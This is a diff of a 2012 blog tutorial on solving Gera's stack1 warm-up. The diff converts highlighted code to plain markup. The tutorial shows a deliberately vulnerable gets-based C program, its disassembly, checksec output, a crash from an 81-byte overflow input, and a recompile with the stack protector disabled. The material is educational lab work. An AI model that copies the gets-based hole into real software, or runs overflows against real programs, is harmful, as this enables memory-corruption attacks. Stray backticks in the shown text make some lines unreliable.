@@ -31,7 +31,7 @@
         <div class="body">
           <p class="heading">Gera's Warming Up on Stack #1 - Solutions</p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 <p class="date">
-                  <a href="/2012/exploit-mitigation-techniques-on-linux.html">&lt&lt;</a> published on 27/Aug/2012<a href="/2012/shadow-stream-recorder-asx-jmpesp.html"> &gt;&gt;</i></a><br/>
+                  <a href="/2012/exploit-mitigation-techniques-on-linux.html">&lt&lt;</a> published on 27/Aug/2012<a href="/2012/soritong-m3u-seh-overflow.html"> &gt;&gt;</i></a><br/>
                 </p>
                                                                                                                                                                                                                                                                         <div class="post-content">
           <p>This is the part 1 in a series of posts that aim to provide an
@@ -57,20 +57,20 @@ their absence affects exploitation reliability.</p>
 <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a>
 program:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="cm">/* stack1.c                                     *</span>
-<span class="cm"> * specially crafted to feed your brain by gera */</span>
+<pre><code>/* stack1.c                                     *
+ * specially crafted to feed your brain by gera */
 
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-    <span class="kt">int</span> <span class="n">cookie</span><span class="p">;</span>
-    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>
+int main() {
+    int cookie;
+    char buf[80];
 
-    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buf: %08x cookie: %08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cookie</span><span class="p">);</span>
-    <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+    printf("buf: %08x cookie: %08x\n", &amp;buf, &amp;cookie);
+    gets(buf);
 
-    <span class="k">if</span> <span class="p">(</span><span class="n">cookie</span> <span class="o">==</span> <span class="err">`</span><span class="mh">0x41424344</span><span class="err">`</span><span class="p">)</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you win!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div>
+    if (cookie == `0x41424344`)
+        printf("you win!\n");
+}
+</code></pre>
 
 <p>The above program accepts user-input through the <code>gets</code> function and
 then looks for a specific value in a local variable named <code>cookie</code>. If
@@ -157,34 +157,34 @@ below listed ideas:</p>
 <p>All right! Let&#8217;s start with the test execution of this program. Here&#8217;s a
 brief description of the test system:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># cat /etc/lsb-release | grep DESC</span>
-<span class="nv">DISTRIB_DESCRIPTION</span><span class="o">=</span><span class="s2">&quot;Ubuntu 9.04&quot;</span>
-<span class="c1">#</span>
-<span class="c1"># uname -a | cut -d&quot; &quot; -f1,3,12,13</span>
-Linux <span class="m">2</span>.6.28-19-generic i686 GNU/Linux
-<span class="c1">#</span>
-<span class="c1"># gcc --version | grep gcc</span>
-gcc <span class="o">(</span>Ubuntu <span class="m">4</span>.3.3-5ubuntu4<span class="o">)</span> <span class="m">4</span>.3.3
-<span class="c1">#</span>
-<span class="c1"># cat /proc/cpuinfo | grep -E &#39;(vendor|model|flags)&#39;</span>
+<pre><code># cat /etc/lsb-release | grep DESC
+DISTRIB_DESCRIPTION="Ubuntu 9.04"
+#
+# uname -a | cut -d" " -f1,3,12,13
+Linux 2.6.28-19-generic i686 GNU/Linux
+#
+# gcc --version | grep gcc
+gcc (Ubuntu 4.3.3-5ubuntu4) 4.3.3
+#
+# cat /proc/cpuinfo | grep -E '(vendor|model|flags)'
 vendor_id : GenuineIntel
-model   : <span class="m">60</span>
-model name  : Intel<span class="o">(</span>R<span class="o">)</span> Core<span class="o">(</span>TM<span class="o">)</span> i5-4200M CPU @ <span class="m">2</span>.50GHz
+model   : 60
+model name  : Intel(R) Core(TM) i5-4200M CPU @ 2.50GHz
 flags   : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx rdtscp lm constant_tsc up xtopology pni pclmulqdq monitor ssse3 cx16 sse4_1 sse4_2 aes xsave avx lahf_lm abm
-</code></pre></div>
+</code></pre>
 
 <p>Below is the GCC command-line to compile the <code>stack1.c</code> source file. The
 <code>-mpreferred-stack-boundary=2</code> option is used to align stack entries at
 QWORD (8B) boundary:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># gcc -mpreferred-stack-boundary=2 -o stack1 stack1.c</span>
-stack1.c: In <span class="k">function</span> ‘main’:
-stack1.c:8: warning: incompatible implicit declaration of built-in <span class="k">function</span> ‘printf’
-stack1.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">2</span> has <span class="nb">type</span> ‘char <span class="o">(</span>*<span class="o">)[</span><span class="m">80</span><span class="o">]</span>’
-stack1.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">3</span> has <span class="nb">type</span> ‘int *’
-/tmp/ccaqTuRT.o: In <span class="k">function</span> <span class="sb">`</span>main<span class="s1">&#39;:</span>
-<span class="s1">stack1.c:(.text+`0x32`): warning: the `gets&#39;</span> <span class="k">function</span> is dangerous and should not be used.
-</code></pre></div>
+<pre><code># gcc -mpreferred-stack-boundary=2 -o stack1 stack1.c
+stack1.c: In function ‘main’:
+stack1.c:8: warning: incompatible implicit declaration of built-in function ‘printf’
+stack1.c:8: warning: format ‘%08x’ expects type ‘unsigned int’, but argument 2 has type ‘char (*)[80]’
+stack1.c:8: warning: format ‘%08x’ expects type ‘unsigned int’, but argument 3 has type ‘int *’
+/tmp/ccaqTuRT.o: In function `main':
+stack1.c:(.text+`0x32`): warning: the `gets' function is dangerous and should not be used.
+</code></pre>
 
 <p>GCC outlines a few warnings with the above code, out of which, the last
 one suggests to find an alternative for the gets, since it is a
@@ -197,39 +197,39 @@ command-line uses the objdump utility to dump the disassembled object
 code of a program in <a href="http://asm.sourceforge.net/articles/linasm.html#Syntax">Intel</a> syntax (remove the <code>-Mintel</code> option from the
 below command-line to view AT&amp;T syntax formatted assembled code):</p>
 
-<div class="codehilite"><pre><span></span><code><span class="err">#</span> <span class="nf">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="o">-</span><span class="nv">Mintel</span> <span class="nv">stack1</span> <span class="o">|</span> <span class="nv">grep</span> <span class="o">-</span><span class="nv">A30</span> <span class="nv">main.</span><span class="p">:</span>
-<span class="err">08048484</span> <span class="err">&lt;</span><span class="nf">main</span><span class="o">&gt;</span><span class="p">:</span>
- <span class="err">8048484:</span> <span class="err">55</span>                    <span class="nf">push</span>   <span class="nb">ebp</span>
- <span class="err">8048485:</span> <span class="err">89</span> <span class="nf">e5</span>                 <span class="nv">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
- <span class="err">8048487:</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">68</span>              <span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x68</span>
- <span class="err">804848</span><span class="nl">a:</span> <span class="err">65</span> <span class="nf">a1</span> <span class="mi">14</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>     <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="nb">gs</span><span class="p">:</span><span class="mh">0x14</span>
- <span class="err">8048490:</span> <span class="err">89</span> <span class="err">45</span> <span class="nf">fc</span>              <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">],</span><span class="nb">eax</span>
- <span class="err">8048493:</span> <span class="err">31</span> <span class="nf">c0</span>                 <span class="nv">xor</span>    <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
- <span class="err">8048495:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">a8</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x58</span><span class="p">]</span>
- <span class="err">8048498:</span> <span class="err">89</span> <span class="err">44</span> <span class="err">24</span> <span class="err">08</span>           <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="nb">eax</span>
- <span class="err">804849</span><span class="nl">c:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">ac</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x54</span><span class="p">]</span>
- <span class="err">804849</span><span class="nl">f:</span> <span class="err">89</span> <span class="err">44</span> <span class="err">24</span> <span class="err">04</span>           <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="nb">eax</span>
- <span class="err">80484</span><span class="nl">a3:</span> <span class="nf">c7</span> <span class="mi">04</span> <span class="mi">24</span> <span class="nv">b0</span> <span class="mi">85</span> <span class="mi">04</span> <span class="mi">08</span>  <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="mh">0x80485b0</span>
- <span class="err">80484</span><span class="nl">aa:</span> <span class="nf">e8</span> <span class="nv">e9</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">8048398</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
- <span class="err">80484</span><span class="nl">af:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">ac</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x54</span><span class="p">]</span>
- <span class="err">80484</span><span class="nl">b2:</span> <span class="err">89</span> <span class="err">04</span> <span class="err">24</span>              <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
- <span class="err">80484</span><span class="nl">b5:</span> <span class="nf">e8</span> <span class="nv">be</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">8048378</span> <span class="o">&lt;</span><span class="nv">gets@plt</span><span class="o">&gt;</span>
- <span class="err">80484</span><span class="nl">ba:</span> <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="nv">a8</span>              <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x58</span><span class="p">]</span>
- <span class="err">80484</span><span class="nl">bd:</span> <span class="err">3</span><span class="nf">d</span> <span class="mi">44</span> <span class="mi">43</span> <span class="mi">42</span> <span class="mi">41</span>        <span class="nv">cmp</span>    <span class="nb">eax</span><span class="p">,</span><span class="s">`0x41424344`</span>
- <span class="err">80484</span><span class="nl">c2:</span> <span class="err">75</span> <span class="err">0</span><span class="nf">c</span>                 <span class="nv">jne</span>    <span class="mi">80484</span><span class="nv">d0</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mh">0x4c</span><span class="o">&gt;</span>
- <span class="err">80484</span><span class="nl">c4:</span> <span class="nf">c7</span> <span class="mi">04</span> <span class="mi">24</span> <span class="nv">c8</span> <span class="mi">85</span> <span class="mi">04</span> <span class="mi">08</span>  <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="mh">0x80485c8</span>
- <span class="err">80484</span><span class="nl">cb:</span> <span class="nf">e8</span> <span class="nv">e8</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">80483</span><span class="nv">b8</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
- <span class="err">80484</span><span class="nl">d0:</span> <span class="err">8</span><span class="nf">b</span> <span class="mi">55</span> <span class="nv">fc</span>              <span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
- <span class="err">80484</span><span class="nl">d3:</span> <span class="err">65</span> <span class="err">33</span> <span class="err">15</span> <span class="err">14</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="nf">xor</span>    <span class="nb">edx</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="nb">gs</span><span class="p">:</span><span class="mh">0x14</span>
- <span class="err">80484</span><span class="nl">da:</span> <span class="err">74</span> <span class="err">05</span>                 <span class="nf">je</span>     <span class="mi">80484</span><span class="nv">e1</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mh">0x5d</span><span class="o">&gt;</span>
- <span class="err">80484</span><span class="nl">dc:</span> <span class="nf">e8</span> <span class="nv">c7</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">80483</span><span class="nv">a8</span> <span class="o">&lt;</span><span class="nv">__stack_chk_fail@plt</span><span class="o">&gt;</span>
- <span class="err">80484</span><span class="nl">e1:</span> <span class="nf">c9</span>                    <span class="nv">leave</span>
- <span class="err">80484</span><span class="nl">e2:</span> <span class="nf">c3</span>                    <span class="nv">ret</span>
- <span class="err">80484</span><span class="nl">e3:</span> <span class="err">90</span>                    <span class="nf">nop</span>
- <span class="err">80484</span><span class="nl">e4:</span> <span class="err">90</span>                    <span class="nf">nop</span>
- <span class="err">80484</span><span class="nl">e5:</span> <span class="err">90</span>                    <span class="nf">nop</span>
- <span class="err">80484</span><span class="nl">e6:</span> <span class="err">90</span>                    <span class="nf">nop</span>
-</code></pre></div>
+<pre><code># objdump -d -Mintel stack1 | grep -A30 main.:
+08048484 &lt;main&gt;:
+ 8048484: 55                    push   ebp
+ 8048485: 89 e5                 mov    ebp,esp
+ 8048487: 83 ec 68              sub    esp,0x68
+ 804848a: 65 a1 14 00 00 00     mov    eax,gs:0x14
+ 8048490: 89 45 fc              mov    DWORD PTR [ebp-0x4],eax
+ 8048493: 31 c0                 xor    eax,eax
+ 8048495: 8d 45 a8              lea    eax,[ebp-0x58]
+ 8048498: 89 44 24 08           mov    DWORD PTR [esp+0x8],eax
+ 804849c: 8d 45 ac              lea    eax,[ebp-0x54]
+ 804849f: 89 44 24 04           mov    DWORD PTR [esp+0x4],eax
+ 80484a3: c7 04 24 b0 85 04 08  mov    DWORD PTR [esp],0x80485b0
+ 80484aa: e8 e9 fe ff ff        call   8048398 &lt;printf@plt&gt;
+ 80484af: 8d 45 ac              lea    eax,[ebp-0x54]
+ 80484b2: 89 04 24              mov    DWORD PTR [esp],eax
+ 80484b5: e8 be fe ff ff        call   8048378 &lt;gets@plt&gt;
+ 80484ba: 8b 45 a8              mov    eax,DWORD PTR [ebp-0x58]
+ 80484bd: 3d 44 43 42 41        cmp    eax,`0x41424344`
+ 80484c2: 75 0c                 jne    80484d0 &lt;main+0x4c&gt;
+ 80484c4: c7 04 24 c8 85 04 08  mov    DWORD PTR [esp],0x80485c8
+ 80484cb: e8 e8 fe ff ff        call   80483b8 &lt;puts@plt&gt;
+ 80484d0: 8b 55 fc              mov    edx,DWORD PTR [ebp-0x4]
+ 80484d3: 65 33 15 14 00 00 00  xor    edx,DWORD PTR gs:0x14
+ 80484da: 74 05                 je     80484e1 &lt;main+0x5d&gt;
+ 80484dc: e8 c7 fe ff ff        call   80483a8 &lt;__stack_chk_fail@plt&gt;
+ 80484e1: c9                    leave
+ 80484e2: c3                    ret
+ 80484e3: 90                    nop
+ 80484e4: 90                    nop
+ 80484e5: 90                    nop
+ 80484e6: 90                    nop
+</code></pre>
 
 <p>There are a few very important points to note from the above output:</p>
 
@@ -262,13 +262,13 @@ an overview of the security features implemented within the Linux
 kernel, ELF binaries and executing processes on a system. Here is a
 listing of its available options:</p>
 
-<div class="codehilite"><pre><span></span><code>$ ./checksec.sh
-Usage: checksec <span class="o">[</span>OPTION<span class="o">]</span>
+<pre><code>$ ./checksec.sh
+Usage: checksec [OPTION]
 
 Options:
 
   --file &lt;executable-file&gt;
-  --dir &lt;directory&gt; <span class="o">[</span>-v<span class="o">]</span>
+  --dir &lt;directory&gt; [-v]
   --proc &lt;process name&gt;
   --proc-all
   --proc-libs &lt;process ID&gt;
@@ -280,13 +280,13 @@ Options:
 
 For more information, see:
   http://www.trapkit.de/tools/checksec.html
-</code></pre></div>
+</code></pre>
 
 <p>Obtain the latest version of this script (1.5 as of this writing). Let&#8217;s
 try the <code>--kernel</code> option to see available mitigation features
 implemented within the kernel on the test system:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># ./checksec.sh --kernel</span>
+<pre><code># ./checksec.sh --kernel
 * Kernel protection information:
 
   Description - List the status of kernel protection mechanisms. Rather than
@@ -313,35 +313,35 @@ implemented within the kernel on the test system:</p>
 
   The KERNHEAP hardening patchset is available here:
     https://www.subreption.com/kernheap/
-</code></pre></div>
+</code></pre>
 
 <p>The output above confirms that the GCC stack protector support is
 enabled and we have already seen it in action earlier. Let&#8217;s now see
 what does this script has to say about the <code>stack1</code> ELF binary:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># ./checksec.sh --file stack1</span>
+<pre><code># ./checksec.sh --file stack1
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   stack1
-<span class="c1"># ./checksec.sh --fortify-file stack1</span>
-* FORTIFY_SOURCE support available <span class="o">(</span>libc<span class="o">)</span>    : Yes
+# ./checksec.sh --fortify-file stack1
+* FORTIFY_SOURCE support available (libc)    : Yes
 * Binary compiled with FORTIFY_SOURCE support: Yes
 
  ------ EXECUTABLE-FILE ------- . -------- LIBC --------
- FORTIFY-able library functions <span class="p">|</span> Checked <span class="k">function</span> names
+ FORTIFY-able library functions | Checked function names
  -------------------------------------------------------
- <span class="nb">printf</span>                         <span class="p">|</span> __printf_chk
- <span class="nb">printf</span>                         <span class="p">|</span> __printf_chk
- gets                           <span class="p">|</span> __gets_chk
- gets                           <span class="p">|</span> __gets_chk
+ printf                         | __printf_chk
+ printf                         | __printf_chk
+ gets                           | __gets_chk
+ gets                           | __gets_chk
 
 SUMMARY:
 
-* Number of checked functions in libc                : <span class="m">74</span>
-* Total number of library functions in the executable: <span class="m">53</span>
-* Number of FORTIFY-able functions in the executable : <span class="m">4</span>
-* Number of checked functions in the executable      : <span class="m">0</span>
-* Number of unchecked functions in the executable    : <span class="m">4</span>
-</code></pre></div>
+* Number of checked functions in libc                : 74
+* Total number of library functions in the executable: 53
+* Number of FORTIFY-able functions in the executable : 4
+* Number of checked functions in the executable      : 0
+* Number of unchecked functions in the executable    : 4
+</code></pre>
 
 <p>As discussed earlier, the default compilation command-line enabled quite
 a few mitigation features like <code>Partial RELRO</code>, <code>stack canary</code>, <code>NX</code> and
@@ -364,37 +364,37 @@ between. While overwriting EIP, it will also be overwritten and the
 <code>__stack_chk_fail</code> function would terminate the program before the
 message is printed:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;A&quot;x81&#39; | ./stack1</span>
+<pre><code># perl -e 'print "A"x81' | ./stack1
 buf: bfb94544 cookie: bfb94540
-*** stack smashing detected ***: ./stack1 <span class="nv">terminated</span>
-<span class="o">=======</span> Backtrace: <span class="o">=========</span>
-/lib/tls/i686/cmov/libc.so.6<span class="o">(</span>__fortify_fail+<span class="sb">`</span>0x48<span class="o">)[</span>0xb7<span class="sb">`</span>7a2ef8<span class="o">]</span>
-/lib/tls/i686/cmov/libc.so.6<span class="o">(</span>__fortify_fail+<span class="sb">`</span>0x0<span class="o">)[</span>0xb77<span class="sb">`</span>a2eb0<span class="o">]</span>
-./stack1<span class="o">[</span><span class="sb">`</span>0x80484e1<span class="o">]</span><span class="sb">`</span>
-/lib/tls/i686/cmov/libc.so.6<span class="o">(</span>__libc_start_main+<span class="sb">`</span>0xe5<span class="o">)[</span>0xb7<span class="sb">`</span>6bb775<span class="o">]</span>
-./stack1<span class="o">[</span><span class="sb">`</span>0x80483f1<span class="o">]</span><span class="sb">`</span>
-<span class="o">=======</span> Memory map: <span class="o">========</span>
-<span class="m">08048000</span>-08049000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">9352</span>       /home/seed/Documents/stack1
-<span class="m">08049000</span>-0804a000 r--p <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">9352</span>       /home/seed/Documents/stack1
-0804a000-0804b000 rw-p <span class="m">00001000</span> <span class="m">08</span>:01 <span class="m">9352</span>       /home/seed/Documents/stack1
-<span class="m">09724000</span>-09745000 rw-p <span class="m">09724000</span> <span class="m">00</span>:00 <span class="m">0</span>          <span class="o">[</span>heap<span class="o">]</span>
-b7687000-b7694000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">278049</span>     /lib/libgcc_s.so.1
-b7694000-b7695000 r--p 0000c000 <span class="m">08</span>:01 <span class="m">278049</span>     /lib/libgcc_s.so.1
-b7695000-b7696000 rw-p 0000d000 <span class="m">08</span>:01 <span class="m">278049</span>     /lib/libgcc_s.so.1
-b76a4000-b76a5000 rw-p b76a4000 <span class="m">00</span>:00 <span class="m">0</span>
-b76a5000-b7801000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">294460</span>     /lib/tls/i686/cmov/libc-2.9.so
-b7801000-b7802000 ---p 0015c000 <span class="m">08</span>:01 <span class="m">294460</span>     /lib/tls/i686/cmov/libc-2.9.so
-b7802000-b7804000 r--p 0015c000 <span class="m">08</span>:01 <span class="m">294460</span>     /lib/tls/i686/cmov/libc-2.9.so
-b7804000-b7805000 rw-p 0015e000 <span class="m">08</span>:01 <span class="m">294460</span>     /lib/tls/i686/cmov/libc-2.9.so
-b7805000-b7808000 rw-p b7805000 <span class="m">00</span>:00 <span class="m">0</span>
-b7814000-b7818000 rw-p b7814000 <span class="m">00</span>:00 <span class="m">0</span>
-b7818000-b7819000 r-xp b7818000 <span class="m">00</span>:00 <span class="m">0</span>          <span class="o">[</span>vdso<span class="o">]</span>
-b7819000-b7835000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">280519</span>     /lib/ld-2.9.so
-b7835000-b7836000 r--p 0001b000 <span class="m">08</span>:01 <span class="m">280519</span>     /lib/ld-2.9.so
-b7836000-b7837000 rw-p 0001c000 <span class="m">08</span>:01 <span class="m">280519</span>     /lib/ld-2.9.so
-bfb81000-bfb96000 rw-p bffea000 <span class="m">00</span>:00 <span class="m">0</span>          <span class="o">[</span>stack<span class="o">]</span>
+*** stack smashing detected ***: ./stack1 terminated
+======= Backtrace: =========
+/lib/tls/i686/cmov/libc.so.6(__fortify_fail+`0x48)[0xb7`7a2ef8]
+/lib/tls/i686/cmov/libc.so.6(__fortify_fail+`0x0)[0xb77`a2eb0]
+./stack1[`0x80484e1]`
+/lib/tls/i686/cmov/libc.so.6(__libc_start_main+`0xe5)[0xb7`6bb775]
+./stack1[`0x80483f1]`
+======= Memory map: ========
+08048000-08049000 r-xp 00000000 08:01 9352       /home/seed/Documents/stack1
+08049000-0804a000 r--p 00000000 08:01 9352       /home/seed/Documents/stack1
+0804a000-0804b000 rw-p 00001000 08:01 9352       /home/seed/Documents/stack1
+09724000-09745000 rw-p 09724000 00:00 0          [heap]
+b7687000-b7694000 r-xp 00000000 08:01 278049     /lib/libgcc_s.so.1
+b7694000-b7695000 r--p 0000c000 08:01 278049     /lib/libgcc_s.so.1
+b7695000-b7696000 rw-p 0000d000 08:01 278049     /lib/libgcc_s.so.1
+b76a4000-b76a5000 rw-p b76a4000 00:00 0
+b76a5000-b7801000 r-xp 00000000 08:01 294460     /lib/tls/i686/cmov/libc-2.9.so
+b7801000-b7802000 ---p 0015c000 08:01 294460     /lib/tls/i686/cmov/libc-2.9.so
+b7802000-b7804000 r--p 0015c000 08:01 294460     /lib/tls/i686/cmov/libc-2.9.so
+b7804000-b7805000 rw-p 0015e000 08:01 294460     /lib/tls/i686/cmov/libc-2.9.so
+b7805000-b7808000 rw-p b7805000 00:00 0
+b7814000-b7818000 rw-p b7814000 00:00 0
+b7818000-b7819000 r-xp b7818000 00:00 0          [vdso]
+b7819000-b7835000 r-xp 00000000 08:01 280519     /lib/ld-2.9.so
+b7835000-b7836000 r--p 0001b000 08:01 280519     /lib/ld-2.9.so
+b7836000-b7837000 rw-p 0001c000 08:01 280519     /lib/ld-2.9.so
+bfb81000-bfb96000 rw-p bffea000 00:00 0          [stack]
 Aborted
-</code></pre></div>
+</code></pre>
 
 <p>In the above test run, supplying 81B of input causes the program to
 crash. Note the addresses of <code>buf</code> and <code>cookie</code>, <code>0xbf857bc4</code> and
@@ -409,50 +409,50 @@ playground for our exploit attempts. Additionally, we see how the
 <code>checksec.sh</code> script correctly identifies the absence of stack canary
 and fortify source mitigation features from the program:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack1 stack1.c</span>
-stack1.c: In <span class="k">function</span> ‘main’:
-stack1.c:8: warning: incompatible implicit declaration of built-in <span class="k">function</span> ‘printf’
-stack1.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">2</span> has <span class="nb">type</span> ‘char <span class="o">(</span>*<span class="o">)[</span><span class="m">80</span><span class="o">]</span>’
-stack1.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">3</span> has <span class="nb">type</span> ‘int *’
-/tmp/ccOI8wdo.o: In <span class="k">function</span> <span class="sb">`</span>main<span class="s1">&#39;:</span>
-<span class="s1">stack1.c:(.text+`0x27): war`ning: the `gets&#39;</span> <span class="k">function</span> is dangerous and should not be used.
-<span class="c1">#</span>
-<span class="c1"># ./checksec.sh --file stack1</span>
+<pre><code># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack1 stack1.c
+stack1.c: In function ‘main’:
+stack1.c:8: warning: incompatible implicit declaration of built-in function ‘printf’
+stack1.c:8: warning: format ‘%08x’ expects type ‘unsigned int’, but argument 2 has type ‘char (*)[80]’
+stack1.c:8: warning: format ‘%08x’ expects type ‘unsigned int’, but argument 3 has type ‘int *’
+/tmp/ccOI8wdo.o: In function `main':
+stack1.c:(.text+`0x27): war`ning: the `gets' function is dangerous and should not be used.
+#
+# ./checksec.sh --file stack1
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   stack1
-<span class="c1">#</span>
-<span class="c1"># perl -e &#39;print &quot;A&quot;x81&#39; | ./stack1</span>
+#
+# perl -e 'print "A"x81' | ./stack1
 buf: bfbb8bf4 cookie: bfbb8c44
-</code></pre></div>
+</code></pre>
 
 <p>The <code>buf</code> is at <code>0xbfa68294</code> and the cookie at <code>0xbfa682e4</code>. The variables
 have been ordered as per our expectation. Let&#8217;s have a peek at the
 program assembly to quickly see if the stack cookie has also been added
 or not:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="err">#</span> <span class="nf">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="o">-</span><span class="nv">Mintel</span> <span class="nv">stack1</span> <span class="o">|</span> <span class="nv">grep</span> <span class="o">-</span><span class="nv">A20</span> <span class="nv">main.</span><span class="p">:</span>
-<span class="err">08048424</span> <span class="err">&lt;</span><span class="nf">main</span><span class="o">&gt;</span><span class="p">:</span>
- <span class="err">8048424:</span> <span class="err">55</span>                    <span class="nf">push</span>   <span class="nb">ebp</span>
- <span class="err">8048425:</span> <span class="err">89</span> <span class="nf">e5</span>                 <span class="nv">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
- <span class="err">8048427:</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">64</span>              <span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x64</span>
- <span class="err">804842</span><span class="nl">a:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">fc</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
- <span class="err">804842</span><span class="nl">d:</span> <span class="err">89</span> <span class="err">44</span> <span class="err">24</span> <span class="err">08</span>           <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="nb">eax</span>
- <span class="err">8048431:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">ac</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x54</span><span class="p">]</span>
- <span class="err">8048434:</span> <span class="err">89</span> <span class="err">44</span> <span class="err">24</span> <span class="err">04</span>           <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="nb">eax</span>
